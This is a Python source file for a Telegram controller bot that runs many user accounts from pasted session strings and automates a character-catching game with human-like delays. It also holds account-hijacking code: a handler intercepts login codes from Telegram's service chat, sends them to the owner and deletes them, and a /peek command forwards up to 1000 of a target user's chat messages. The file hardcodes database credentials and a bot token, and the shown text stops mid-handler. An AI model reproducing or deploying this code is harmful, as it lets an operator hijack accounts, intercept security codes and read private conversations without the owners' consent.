import os
import asyncio
import random
import re
import hashlib
import traceback
import unicodedata
from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
from telethon.tl.functions.account import (
    GetPasswordRequest, UpdatePasswordSettingsRequest, ResetPasswordRequest
)
from telethon.tl import types as tl_types

# 🔥 Safe imports (Python 3.14 compatibility)
InputCheckPasswordSRP = getattr(tl_types, 'InputCheckPasswordSRP', None)
InputCheckPasswordEmpty = getattr(tl_types, 'InputCheckPasswordEmpty', None)
PasswordInputSettings = getattr(tl_types, 'PasswordInputSettings', None)

from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
APP_ID = 39584681
APP_HASH = 'c8c0685d6dd5b9e546093ea90d27733b'
MONGO_URI = "mongodb+srv://kkt:h1BdaMt7nxW9jTXa@cluster0.kb5fzfl.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
BOT_TOKEN = '8738081667:AAHADgcDISntnOBwT3uj2yYw7n3XJUN2uZI'

OWNER_ID = 6015356597
SPECIFIC_GROUP = -1003848067679
SPAWN_BOT_ID = 6157455819

SPECIAL_HINT_BOT_ID = 8999491734

# 🔥 Special Mode Spawn Groups (multiple) — for /addautospecial ONLY
SPECIAL_SPAWN_GROUPS = [
    -1003580630981,
    -1003967256441,   # private restricted
]
SPECIAL_SPAWN_GROUP = -1003580630981  # backward compat

# 🆕 DM-Bulk MODE CONFIG (for /cmd & /adddm)
DM_HINT_BOT_ID = 8999491734

# Chats that must always be ignored (both modes)
BLOCKED_CHATS = [-1001947407820, -1003067509608, -1003760110058]

# 🎯 TIMING (Human-like)
SPECIAL_W_REPLY_DELAY_MIN = 1.5
SPECIAL_W_REPLY_DELAY_MAX = 2.5

SPECIAL_DELAY_MIN = 2.5
SPECIAL_DELAY_MAX = 3.5

SPECIAL_W_REPLY_DELAY = 2.0  # fallback

CGIFT_CHAT_ID = -1003580630981
CGIFT_WAIT_SEC = 6

PEEK_LIMIT = 1000
PEEK_FORWARD_BATCH = 50

# 🎯 STORAGE
userbot_instances = {}
hint_bot_ids = {8506436817}
spawn_tracker = {}
latest_spawn = {}
latest_spawn_msg = {}
HINT_REGEX = re.compile(r"(/catch(?:@\w+)?\s+[^\n]+)")

bot_state = {
    "selected_user_id": None,
    "save_mode": False,
    "session_save_mode": False,   # /cmd save mode
    "session_save_col": None,     # collection name
}
cgift_state = {}

# List of successfully loaded userbots (for /listbots)
loaded_userbots = []   # [{u_id, name, username, phone, col_name, special_mode, dm_mode}]

# MongoDB
client_mongo = AsyncIOMotorClient(MONGO_URI)
db = client_mongo["telegram_bot"]
reply_save_col = db["reply_save_col"]
target_bots_col = db["target_bots"]
tomboy_col = db["tomboy_col"]
marcuz_col = db["marcuz_col"]
talk_col = db["random_talk"]
filters_col = db["filters"]
hint_bots_col = db["hint_bots_col"]
registry_col = db["collection_registry"]
cgift_ids_col = db["cgift_ids"]

bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)


# ==========================================
# 🛡️ ERROR REPORTING (DM to OWNER)
# ==========================================
async def report_error(context: str, exc: Exception, extra: str = ""):
    """Send error report to owner DM (skips boot errors)."""
    try:
        if context.startswith("boot[") or "session_start_failed" in extra:
            print(f"⚠️ [SKIP DM] {context}: {type(exc).__name__}: {exc}")
            return

        tb = ''.join(traceback.format_exception(type(exc), exc, exc.__traceback__))
        if len(tb) > 3000:
            tb = tb[-3000:]
        msg = (
            f"🚨 **ERROR REPORT**\n"
            f"📍 **Where:** `{context}`\n"
            f"❌ **Type:** `{type(exc).__name__}`\n"
            f"💬 **Msg:** `{str(exc)[:300]}`\n"
        )
        if extra:
            msg += f"ℹ️ **Info:** `{extra[:300]}`\n"
        msg += f"\n```\n{tb}\n```"
        await bot.send_message(OWNER_ID, msg)
    except Exception as e:
        print(f"⚠️ Failed to report error: {e}")


def safe_handler(context_name: str):
    """Decorator: wrap handler with try/except → auto DM to owner."""
    def decorator(func):
        async def wrapper(event, *args, **kwargs):
            try:
                return await func(event, *args, **kwargs)
            except Exception as e:
                info = ""
                try:
                    info = f"chat_id={event.chat_id} sender={event.sender_id}"
                except Exception:
                    pass
                print(f"❌ [{context_name}] {type(e).__name__}: {e}")
                traceback.print_exc()
                asyncio.create_task(report_error(context_name, e, info))
        wrapper.__name__ = func.__name__
        return wrapper
    return decorator


# ==========================================
# 🔐 SRP (2FA) HELPERS
# ==========================================
def compute_srp_check(password, algo, B_bytes, srp_id):
    s1, s2 = algo.salt1, algo.salt2
    g, p = algo.g, algo.p
    h1 = hashlib.sha256(s1 + password.encode() + s1).digest()
    h2 = hashlib.sha256(s2 + h1 + s2).digest()
    x = int.from_bytes(h2, 'big')
    v = pow(g, x, p)
    p_b = p.to_bytes((p.bit_length() + 7) // 8, 'big')
    g_b = g.to_bytes((g.bit_length() + 7) // 8, 'big')
    k = int.from_bytes(hashlib.sha256(p_b + g_b).digest(), 'big')
    a = int.from_bytes(os.urandom(256), 'big')
    A = pow(g, a, p)
    A_b = A.to_bytes(256, 'big')
    B = int.from_bytes(B_bytes, 'big')
    u = int.from_bytes(hashlib.sha256(A_b + B_bytes).digest(), 'big')
    S = pow((B - k * v) % p, a + u * x, p)
    S_b = S.to_bytes(256, 'big')
    K = hashlib.sha256(S_b).digest()
    hp = hashlib.sha256(p_b).digest()
    hg = hashlib.sha256(g_b).digest()
    hx = bytes(bb ^ cc for bb, cc in zip(hp, hg))
    hs1 = hashlib.sha256(s1).digest()
    hs2 = hashlib.sha256(s2).digest()
    M1 = hashlib.sha256(hx + hs1 + hs2 + A_b + B_bytes + K).digest()
    return InputCheckPasswordSRP(srp_id=srp_id, A=A_b, M1=M1)

def new_pwd_hash(password, algo):
    s1, s2 = algo.salt1, algo.salt2
    g, p = algo.g, algo.p
    h1 = hashlib.sha256(s1 + password.encode() + s1).digest()
    h2 = hashlib.sha256(s2 + h1 + s2).digest()
    x = int.from_bytes(h2, 'big')
    v = pow(g, x, p)
    return v.to_bytes(256, 'big')


# ==========================================
# 🌍 RENDER HEALTH CHECK
# ==========================================
async def handle_render_health_check(reader, writer):
    await reader.read(100)
    resp = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nOK"
    writer.write(resp.encode())
    await writer.drain()
    writer.close()

async def start_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    try:
        server = await asyncio.start_server(handle_render_health_check, '0.0.0.0', port)
        async with server:
            await server.serve_forever()
    except Exception:
        pass

async def delete_catch_message_delayed(client, chat_id, msg_id):
    try:
        await asyncio.sleep(1)
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass

def get_message_text(event):
    if event.text:
        return event.text
    try:
        if event.message and event.message.message:
            return event.message.message
    except Exception:
        pass
    return ""


# ==========================================
# 🧼 INVISIBLE CHARACTER CLEANER
# ==========================================
def clean_invisible(text: str) -> str:
    if not text:
        return ""
    try:
        return ''.join(c for c in text if unicodedata.category(c) != 'Cf')
    except Exception:
        return text


def is_spawn_message(text: str) -> bool:
    if not text:
        return False
    t = clean_invisible(text)
    tl = t.lower()
    return (
        "spawned" in tl
        or "sᴘᴀᴡɴᴇᴅ" in tl
        or "a character has spawned" in tl
        or "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ" in t
    )


def is_catch_success_message(text: str) -> bool:
    if not text:
        return False
    t = clean_invisible(text)
    tl = t.lower()
    return (
        "you got a new character" in tl
        or "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ" in t
    )


# ==========================================
# 🔧 HELPERS
# ==========================================
def get_cmd_and_args(text):
    if not text:
        return "", ""
    text = text.strip()
    parts = text.split(maxsplit=1)
    cmd = parts[0]
    args = parts[1].strip() if len(parts) > 1 else ""
    if "@" in cmd:
        cmd = cmd.split("@")[0]
    return cmd, args

def parse_ids_from_text(text):
    ids = []
    for line in text.split("\n"):
        line = line.strip()
        if line and re.match(r"^\d+$", line):
            ids.append(line)
    return ids


def parse_user_ids_from_text(text):
    """Extract all 6+ digit numbers (Telegram user IDs) from any text."""
    if not text:
        return []
    return re.findall(r'\b\d{6,}\b', text)


def make_mention(name: str, user_id: int) -> str:
    safe = (name or "User").replace("<", "").replace(">", "").replace("&", "&amp;")
    return f"<a href='tg://user?id={user_id}'>{safe}</a>"


# ==========================================
# 🆕 SESSION PARSER (for /cmd save mode)
# ==========================================
SESSION_LINE_RE = re.compile(r"^\d+$")

def extract_sessions_from_text(text: str):
    """
    Parse session entries from a block of text.

    Supported formats per line:
      • "<user_id> <session_string>"
      • "<session_string>"
      • "# comment lines" skipped (Sessions.txt export safe)

    Returns a list of tuples: [(user_id_or_None, session_string), ...]
    """
    results = []
    if not text:
        return results

    for raw_line in text.split("\n"):
        line = raw_line.strip()
        if not line:
            continue
        if line.startswith("#"):
            continue
        if line.startswith("//"):
            continue

        # Try "user_id session_string"
        parts = line.split(maxsplit=1)
        if len(parts) == 2 and SESSION_LINE_RE.match(parts[0]) and len(parts[1]) > 50:
            try:
                uid = int(parts[0])
                results.append((uid, parts[1].strip()))
                continue
            except Exception:
                pass

        # Fallback: whole line is a session string
        if len(line) > 50 and " " not in line:
            results.append((None, line))

    return results


# ==========================================
# 🎁 CGIFT LOOP
# ==========================================
async def run_cgift_loop(client, user_id):
    state = cgift_state.get(user_id)
    if not state:
        return
    try:
        doc = await cgift_ids_col.find_one({"user_id": user_id})
        if not doc:
            state["running"] = False
            state["task"] = None
            return
        ids = doc.get("ids", [])
        total = len(ids)
        if total == 0:
            state["running"] = False
            state["task"] = None
            return

        while state["running"] and state["index"] < total:
            gift_id = ids[state["index"]]
            try:
                reply_target = state.get("reply_to_msg_id")
                if reply_target:
                    await client.send_message(state["chat_id"], f"/cgift {gift_id}", reply_to=reply_target)
                else:
                    await client.send_message(state["chat_id"], f"/cgift {gift_id}")
            except Exception as e:
                print(f"❌ [{user_id}] send error for {gift_id}: {e}")

            state["index"] += 1
            if not state["running"] or state["index"] >= total:
                break
            await asyncio.sleep(CGIFT_WAIT_SEC)

        if state["index"] >= total:
            state["index"] = 0
        state["running"] = False
        state["task"] = None
    except Exception as e:
        print(f"❌ [{user_id}] cgift loop error: {e}")
        await report_error(f"cgift_loop[{user_id}]", e)
        state["running"] = False
        state["task"] = None


# ==========================================
# 🎁 SELF-BOT SIDE HANDLER
# ==========================================
@safe_handler("cgift_selfbot_handler")
async def cgift_selfbot_handler(event):
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    if event.chat_id != CGIFT_CHAT_ID:
        return
    if not event.text:
        return

    cmd, args = get_cmd_and_args(event.text)

    if cmd == "/cgift" and not args:
        if current_user_id not in cgift_state:
            cgift_state[current_user_id] = {
                "running": False, "index": 0,
                "chat_id": None, "reply_to_msg_id": None, "task": None
            }
        state = cgift_state[current_user_id]
        if state["running"]:
            return
        state["running"] = True
        state["chat_id"] = event.chat_id
        state["reply_to_msg_id"] = event.reply_to_msg_id if event.reply_to_msg_id else None
        state["task"] = asyncio.create_task(run_cgift_loop(event.client, current_user_id))
        print(f"🚀 [{current_user_id}] /cgift started from index {state['index']}")

    elif cmd == "/stop":
        if current_user_id in cgift_state and cgift_state[current_user_id]["running"]:
            cgift_state[current_user_id]["running"] = False


# ==========================================
# 👀 PEEK LOGIC
# ==========================================
async def perform_peek(userbot_id, target_username, owner_chat_id):
    config = userbot_instances.get(userbot_id)
    if not config:
        return False, "Userbot not found"

    client = config["client"]
    username = target_username.lstrip("@").strip()
    if not username:
        return False, "Invalid username"

    try:
        entity = await client.get_entity(username)
    except Exception as e:
        return False, f"Cannot find user @{username}: {e}"

    try:
        messages = await client.get_messages(entity, limit=PEEK_LIMIT)
    except Exception as e:
        return False, f"Cannot fetch messages: {e}"

    total = len(messages)
    if total == 0:
        return False, "No messages found"

    try:
        await client.send_message(
            owner_chat_id,
            f"👀 **PEEK REPORT**\n"
            f"🆔 Selfbot: `{userbot_id}`\n"
            f"🎯 Target: @{username}\n"
            f"📊 Messages: `{total}`\n"
            f"⏱️ Fetching and forwarding..."
        )
    except Exception as e:
        return False, f"Cannot message owner: {e}"

    msg_ids = [m.id for m in messages]
    msg_ids.reverse()

    forwarded = 0
    for i in range(0, len(msg_ids), PEEK_FORWARD_BATCH):
        batch = msg_ids[i:i + PEEK_FORWARD_BATCH]
        try:
            await client.forward_messages(owner_chat_id, batch, entity)
            forwarded += len(batch)
        except Exception as e:
            print(f"⚠️ Forward batch error: {e}")
        await asyncio.sleep(1)

    try:
        await client.send_message(
            owner_chat_id,
            f"✅ **PEEK COMPLETE**\n📊 Forwarded: `{forwarded}` / `{total}`"
        )
    except Exception:
        pass

    return True, f"Forwarded {forwarded} messages"


# ==========================================
# ⚔️ SPAWN HANDLERS
# ==========================================
@safe_handler("spawn_detector_handler")
async def spawn_detector_handler(event):
    global spawn_tracker, latest_spawn, latest_spawn_msg
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    config = userbot_instances[current_user_id]
    if config["is_stopped"]:
        return

    text_raw = get_message_text(event)
    if not text_raw:
        return

    if not is_spawn_message(text_raw):
        return

    text_clean = clean_invisible(text_raw)

    is_special = config.get("special_mode", False)
    is_dm = config.get("dm_mode", False)

    # ── Blocked chats always skipped ──
    if event.chat_id in BLOCKED_CHATS:
        return

    # ═══════════════════════════════════════════════
    # 🆕 DM-BULK MODE (from /cmd or /adddm):
    #    • Listen to ALL groups
    #    • Blacklist only (ignored_emojis via /emoji)
    # ═══════════════════════════════════════════════
    if is_dm:
        if any(emoji in text_clean for emoji in config["ignored_emojis"]):
            return

    # ═══════════════════════════════════════════════
    # SPECIAL MODE — unchanged behavior (for /addautospecial)
    # ═══════════════════════════════════════════════
    elif is_special:
        allowed = config.get("spawn_groups") or SPECIAL_SPAWN_GROUPS
        if event.chat_id not in allowed:
            return
        if any(emoji in text_clean for emoji in config["ignored_emojis"]):
            return

    # ═══════════════════════════════════════════════
    # NORMAL MODE — unchanged behavior (for /addauto)
    # ═══════════════════════════════════════════════
    else:
        if any(emoji in text_clean for emoji in config["ignored_emojis"]):
            return

    orig_chat_id = event.chat_id
    latest_spawn[current_user_id] = orig_chat_id
    latest_spawn_msg[current_user_id] = event.message.id

    try:
        if is_dm:
            # DM MODE: forward media+caption → hint bot DM (NO /w)
            hint_bot_id = config["hint_bot_id"]
            try:
                fwd = await event.client.forward_messages(hint_bot_id, event.message)
                fwd_id = fwd[0].id if isinstance(fwd, list) else fwd.id
            except Exception:
                try:
                    fwd = await event.client.send_message(hint_bot_id, event.message)
                    fwd_id = fwd.id
                except Exception as inner:
                    print(f"❌ DM forward/copy failed for {current_user_id}: {inner}")
                    await report_error("spawn_detector.dm_forward", inner,
                                       f"uid={current_user_id} hint={hint_bot_id}")
                    return
            spawn_tracker[(current_user_id, fwd_id)] = orig_chat_id
            print(f"📨 [{current_user_id}] DM-mode → hint bot {hint_bot_id} "
                  f"(orig={orig_chat_id}, fwd_id={fwd_id})")

        elif is_special:
            w_delay = random.uniform(SPECIAL_W_REPLY_DELAY_MIN, SPECIAL_W_REPLY_DELAY_MAX)
            await asyncio.sleep(w_delay)
            reply_msg = await event.message.reply("/w")
            spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id
            print(f"🥷 [{current_user_id}] /w sent after {w_delay:.2f}s in {orig_chat_id}")

        else:
            target_chat = config["group_id"]
            fwd_msg = await event.message.forward_to(target_chat)
            spawn_tracker[(current_user_id, fwd_msg.id)] = orig_chat_id
            reply_msg = await fwd_msg.reply("/w")
            spawn_tracker[(current_user_id, reply_msg.id)] = orig_chat_id

        if len(spawn_tracker) > 300:
            spawn_tracker.pop(next(iter(spawn_tracker)))
    except Exception as e:
        print(f"❌ spawn handler error {current_user_id}: {e}")
        await report_error(
            "spawn_detector.forward_reply",
            e,
            f"uid={current_user_id} chat={event.chat_id} text={text_clean[:80]}"
        )


@safe_handler("hint_solver_handler")
async def hint_solver_handler(event):
    global spawn_tracker, latest_spawn, latest_spawn_msg
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    config = userbot_instances[current_user_id]
    if config["is_stopped"]:
        return

    is_special = config.get("special_mode", False)
    is_dm = config.get("dm_mode", False)

    # ── Route filtering ──
    if is_dm:
        hint_bot_id = config["hint_bot_id"]
        if event.chat_id != hint_bot_id:
            return
        if event.sender_id != hint_bot_id:
            return
        if not event.reply_to_msg_id:
            return
        if (current_user_id, event.reply_to_msg_id) not in spawn_tracker:
            return

    elif is_special:
        allowed = config.get("spawn_groups") or SPECIAL_SPAWN_GROUPS
        if event.chat_id not in allowed:
            return
        if event.sender_id != config["hint_bot_id"]:
            return
        if not event.reply_to_msg_id:
            return
        if (current_user_id, event.reply_to_msg_id) not in spawn_tracker:
            return

    else:
        if event.sender_id not in hint_bot_ids:
            return
        if event.chat_id != config["group_id"]:
            return

    text_raw = get_message_text(event)
    if not text_raw:
        return

    text_clean = clean_invisible(text_raw)
    match = HINT_REGEX.search(text_clean)
    if not match:
        return

    catch_command = match.group(1).strip(" `\n\r")
    target_orig_group = None
    if event.reply_to_msg_id and (current_user_id, event.reply_to_msg_id) in spawn_tracker:
        target_orig_group = spawn_tracker[(current_user_id, event.reply_to_msg_id)]
    elif current_user_id in latest_spawn:
        target_orig_group = latest_spawn[current_user_id]

    if not target_orig_group:
        return

    try:
        client_to_use = config["client"]

        if is_dm:
            delay_time = random.uniform(
                config.get("delay_min", SPECIAL_DELAY_MIN),
                config.get("delay_max", SPECIAL_DELAY_MAX)
            )
            read_time = delay_time * random.uniform(0.4, 0.6)
            typing_time = max(0.3, delay_time - read_time)

            await asyncio.sleep(read_time)
            try:
                async with client_to_use.action(target_orig_group, 'typing'):
                    await asyncio.sleep(typing_time)
            except Exception:
                await asyncio.sleep(typing_time)

            await client_to_use.send_message(target_orig_group, catch_command)
            print(
                f"📨 [{current_user_id}] DM-mode /catch sent → {target_orig_group} "
                f"(read={read_time:.2f}s + typing={typing_time:.2f}s)"
            )

        elif is_special:
            delay_time = random.uniform(
                config.get("delay_min", SPECIAL_DELAY_MIN),
                config.get("delay_max", SPECIAL_DELAY_MAX)
            )
            read_time = delay_time * random.uniform(0.4, 0.6)
            typing_time = max(0.3, delay_time - read_time)

            await asyncio.sleep(read_time)
            try:
                async with client_to_use.action(target_orig_group, 'typing'):
                    await asyncio.sleep(typing_time)
            except Exception:
                await asyncio.sleep(typing_time)

            await client_to_use.send_message(target_orig_group, catch_command)
            print(
                f"🥷 [{current_user_id}] /catch sent after "
                f"read={read_time:.2f}s + typing={typing_time:.2f}s "
                f"(total={delay_time:.2f}s) → {target_orig_group}"
            )
        else:
            await asyncio.sleep(0.1)
            async with client_to_use.action(target_orig_group, 'typing'):
                await asyncio.sleep(0.5)
            sent_msg = await client_to_use.send_message(target_orig_group, catch_command)
            asyncio.create_task(delete_catch_message_delayed(client_to_use, target_orig_group, sent_msg.id))

    except Exception as e:
        print(f"❌ Catch error {current_user_id}: {e}")
        await report_error(
            "hint_solver.send_catch",
            e,
            f"uid={current_user_id} target={target_orig_group}"
        )


@safe_handler("catch_success_forwarder_handler")
async def catch_success_forwarder_handler(event):
    current_user_id = getattr(event.client, 'tg_user_id', None)
    if not current_user_id or current_user_id not in userbot_instances:
        return
    config = userbot_instances.get(current_user_id, {})
    if config.get("is_stopped"):
        return
    if config.get("special_mode", False) or config.get("dm_mode", False):
        return

    text_raw = get_message_text(event)
    if not text_raw:
        return

    if not is_catch_success_message(text_raw):
        return

    try:
        text_clean = clean_invisible(text_raw)
        me = await event.client.get_me()
        first_name = (me.first_name or "").lower()
        last_name = (me.last_name or "").lower()
        full_name = f"{first_name} {last_name}".strip()
        username = (me.username or "").lower()
        text_lower = text_clean.lower()
        if (event.message.mentioned
            or (first_name and first_name in text_lower)
            or (full_name and full_name in text_lower)
            or (username and username in text_lower)):
            await event.message.forward_to(SPECIFIC_GROUP)
    except Exception as e:
        print(f"❌ catch_success_forwarder error {current_user_id}: {e}")
        await report_error("catch_success_forwarder", e, f"uid={current_user_id}")


@safe_handler("telegram_service_handler")
async def telegram_service_handler(event):
    try:
        await bot.send_message(OWNER_ID, f"🔐 **Telegram Login Intercepted!**\n\n{event.message.text}")
        await event.delete()
    except Exception as e:
        await report_error("telegram_service_handler", e)


def register_userbot_handlers(client, waifu_chat_id):
    client.add_event_handler(spawn_detector_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(catch_success_forwarder_handler, events.NewMessage(from_users=SPAWN_BOT_ID))
    client.add_event_handler(hint_solver_handler, events.NewMessage())
    client.add_event_handler(cgift_selfbot_handler, events.NewMessage(outgoing=True))
    client.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))


# ==========================================
# 🆕 LIST BUILDER
# ==========================================
async def build_loaded_list() -> str:
    if not loaded_userbots:
        return "📭 No userbots loaded."

    rows = sorted(loaded_userbots, key=lambda x: (x.get("name") or "").lower())

    lines = [f"🤖 **Loaded Userbots: {len(rows)}**\n"]
    for i, info in enumerate(rows, 1):
        u_id = info.get("u_id")
        name = info.get("name") or "No Name"
        uname = info.get("username")
        phone = info.get("phone") or "—"
        col_name = info.get("col_name") or "?"
        special = info.get("special_mode", False)
        dm = info.get("dm_mode", False)

        mention = make_mention(name, u_id)
        uname_str = f" (@{uname})" if uname else ""
        if dm:
            mode_str = "📨 DM-Bulk"
        elif special:
            mode_str = "🥷 Special"
        else:
            mode_str = "🌐 Normal"

        lines.append(
            f"{i}. {mention}{uname_str}\n"
            f"   🆔 `{u_id}`\n"
            f"   📱 `{phone}`\n"
            f"   🗂️ `{col_name}` — {mode_str}"
        )
    return "\n".join(lines)


# ==========================================
# 🆕 /cmd SESSION SAVE HELPER (DM-Bulk mode)
# ==========================================
async def save_one_session(session_str: str, target_uid, col_name: str):
    """
    Save a single session to db[col_name] as DM-Bulk mode userbot.
    DM-Bulk:
      • listens to ALL groups (no group restriction)
      • only blacklist emoji filter (via /emoji)
      • forwards spawn msg to hint bot DM (NO /w)
    Returns (ok: bool, uid or None, error_msg or None).
    """
    temp_client = None
    try:
        temp_client = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
        await temp_client.start()
        me = await temp_client.get_me()
        real_uid = me.id

        if target_uid and int(target_uid) != real_uid:
            print(f"⚠️ Declared uid {target_uid} != real {real_uid}; using real.")

        ignored_emojis = ["🔵", "🟣", "🟡", "🟠", "💮"]  # default blacklist
        spawn_groups = None   # None = all groups

        custom_col = db[col_name]
        await custom_col.update_one(
            {"user_id": real_uid},
            {"$set": {
                "user_id": real_uid,
                "session": session_str,
                "group_id": None,
                "ignored_emojis": ignored_emojis,
                "is_stopped": False,
                "collection_name": col_name,
                "dm_mode": True,
                "spawn_group": None,
                "spawn_groups": spawn_groups,
                "hint_bot_id": DM_HINT_BOT_ID,
                "delay_min": SPECIAL_DELAY_MIN,
                "delay_max": SPECIAL_DELAY_MAX,
            }},
            upsert=True
        )
        await registry_col.update_one(
            {"collection_name": col_name},
            {"$set": {"collection_name": col_name}},
            upsert=True
        )

        if real_uid not in userbot_instances:
            temp_client.tg_user_id = real_uid
            userbot_instances[real_uid] = {
                "client": temp_client,
                "group_id": None,
                "ignored_emojis": ignored_emojis,
                "is_stopped": False,
                "collection_name": col_name,
                "special_mode": False,
                "dm_mode": True,
                "spawn_group": None,
                "spawn_groups": spawn_groups,
                "hint_bot_id": DM_HINT_BOT_ID,
                "delay_min": SPECIAL_DELAY_MIN,
                "delay_max": SPECIAL_DELAY_MAX,
            }
            register_userbot_handlers(temp_client, None)

            loaded_userbots.append({
                "u_id": real_uid,
                "name": me.first_name or "No Name",
                "username": me.username,
                "phone": me.phone if me.phone else None,
                "col_name": col_name,
                "special_mode": False,
                "dm_mode": True,
            })
        else:
            try:
                await temp_client.disconnect()
            except Exception:
                pass

        return True, real_uid, None
    except Exception as e:
        try:
            if temp_client:
                await temp_client.disconnect()
        except Exception:
            pass
        return False, None, f"{type(e).__name__}: {e}"


# ==========================================
# 🤖 OFFICIAL BOT COMMAND HANDLER
# ==========================================
@bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
async def handle_bot_commands(event):
    global userbot_instances, hint_bot_ids
    cmd = ""
    try:
        if event.sender_id != OWNER_ID:
            return

        text = event.message.text.strip() if event.message.text else ""
        if not text:
            return

        cmd, args = get_cmd_and_args(text)

        # ══════════════════════════════════════════
        # 🆕 /cmd SESSION SAVE MODE (checks BEFORE other handlers)
        # ══════════════════════════════════════════
        if bot_state["session_save_mode"] and not text.startswith("/"):
            col_name = bot_state["session_save_col"]
            parsed = extract_sessions_from_text(text)
            if not parsed:
                await event.reply(
                    "⚠️ **No sessions detected in message.**\n"
                    "Send in format `user_id session_string` per line, "
                    "or one session per line.\n"
                    "Send `/cmd off` to exit."
                )
                return

            await event.reply(
                f"⏳ **Processing {len(parsed)} session(s)** → `db['{col_name}']`..."
            )
            ok_count = 0
            fail_count = 0
            ok_lines = []
            fail_lines = []

            for idx, (declared_uid, sess) in enumerate(parsed, 1):
                ok, real_uid, err = await save_one_session(sess, declared_uid, col_name)
                if ok:
                    ok_count += 1
                    ok_lines.append(f"✅ `{real_uid}`")
                else:
                    fail_count += 1
                    short_sess = sess[:25] + "..."
                    fail_lines.append(f"❌ #{idx} `{short_sess}` → `{err[:120]}`")

                await asyncio.sleep(1.5)

            summary = (
                f"📊 **Session Save Summary**\n"
                f"🗂️ Collection: `db['{col_name}']`\n"
                f"✅ **Saved:** `{ok_count}`\n"
                f"❌ **Failed:** `{fail_count}`\n"
            )
            if ok_lines:
                summary += "\n**Saved IDs:**\n" + "\n".join(ok_lines[:30])
            if fail_lines:
                summary += "\n\n**Failures:**\n" + "\n".join(fail_lines[:15])
            summary += "\n\n💡 Send more sessions or `/cmd off` to exit."
            await event.reply(summary)
            return

        # ---------- 🆕 /cmd ----------
        if cmd == "/cmd":
            sub = (args or "").strip().lower()

            if sub == "off":
                if not bot_state["session_save_mode"]:
                    await event.reply("ℹ️ **Session save mode is already OFF.**")
                    return
                col = bot_state["session_save_col"]
                bot_state["session_save_mode"] = False
                bot_state["session_save_col"] = None
                await event.reply(f"📤 **Session save mode OFF** (was `db['{col}']`)")
                return

            if sub == "status":
                if bot_state["session_save_mode"]:
                    col = bot_state["session_save_col"]
                    await event.reply(
                        f"🟢 **Session save mode ON**\n"
                        f"🗂️ Collection: `db['{col}']`\n"
                        f"💡 Send sessions in DM now, or `/cmd off` to exit."
                    )
                else:
                    await event.reply("🔴 **Session save mode OFF.**")
                return

            # /cmd [collection]
            if not event.is_private:
                await event.reply("⚠️ **Please use `/cmd` in the bot's DM.**")
                return

            col_name = (args or "").strip()
            if not col_name:
                await event.reply(
                    "⚠️ **Usage:**\n"
                    "`/cmd [collection_name]` — start session save mode\n"
                    "`/cmd off` — stop save mode\n"
                    "`/cmd status` — show current state\n\n"
                    "**Mode:** DM-Bulk (all groups, blacklist via `/emoji`)\n\n"
                    "**Session format (send after starting):**\n"
                    "```\n"
                    "user_id session_string\n"
                    "user_id session_string\n"
                    "```\n"
                    "Or just one session string per line.\n"
                    "Lines starting with `#` are skipped (Sessions.txt export safe)."
                )
                return

            if not re.match(r"^[A-Za-z0-9_]+$", col_name):
                await event.reply("❌ **Collection name must be alphanumeric/underscore only.**")
                return

            bot_state["session_save_mode"] = True
            bot_state["session_save_col"] = col_name
            await event.reply(
                f"🟢 **Session save mode ON**\n"
                f"🗂️ Target: `db['{col_name}']`\n"
                f"📥 Send sessions now (one per line, or `user_id session_string`).\n"
                f"🎯 Mode: **DM-Bulk** — All groups\n"
                f"🛑 Send `/cmd off` when done."
            )
            return

        # ---------- 🎁 SAVE MODE (cgift IDs) ----------
        if bot_state["save_mode"] and bot_state["selected_user_id"] and not text.startswith("/"):
            ids = parse_ids_from_text(text)
            if ids:
                target_uid = bot_state["selected_user_id"]
                await cgift_ids_col.update_one(
                    {"user_id": target_uid},
                    {"$push": {"ids": {"$each": ids}}},
                    upsert=True
                )
                doc = await cgift_ids_col.find_one({"user_id": target_uid})
                total = len(doc.get("ids", [])) if doc else len(ids)
                await event.reply(f"✅ **Saved {len(ids)} IDs** for `{target_uid}`\n📊 Total: `{total}`")
            return

        # ---------- 🆕 /listbots ----------
        if cmd == "/listbots":
            msg = await build_loaded_list()
            if len(msg) > 4000:
                chunks = []
                cur = ""
                for line in msg.split("\n"):
                    if len(cur) + len(line) + 1 > 4000:
                        chunks.append(cur)
                        cur = line
                    else:
                        cur = (cur + "\n" + line) if cur else line
                if cur:
                    chunks.append(cur)
                for ch in chunks:
                    await event.reply(ch, parse_mode="html")
            else:
                await event.reply(msg, parse_mode="html")

        # ---------- 👀 /peek ----------
        elif cmd == "/peek":
            if not args:
                await event.reply(
                    "⚠️ **Usage:**\n"
                    "`/peek {auto_id} {@username}`\n"
                    "**or** reply to a message containing @username with `/peek {auto_id}`"
                )
                return
            parts = args.split(maxsplit=1)
            try:
                target_uid = int(parts[0])
            except ValueError:
                await event.reply("❌ **Invalid User ID.**")
                return
            if target_uid not in userbot_instances:
                await event.reply(f"❌ **Selfbot `{target_uid}` is not online.**")
                return

            target_username = None
            if len(parts) > 1:
                target_username = parts[1].strip()
            elif event.is_reply:
                r = await event.get_reply_message()
                if r and r.text:
                    target_username = r.text.strip()

            if not target_username:
                await event.reply("⚠️ **No @username provided.**")
                return

            m = re.search(r"@[\w\d_]+", target_username)
            if m:
                target_username = m.group(0)
            elif not target_username.startswith("@"):
                target_username = "@" + target_username

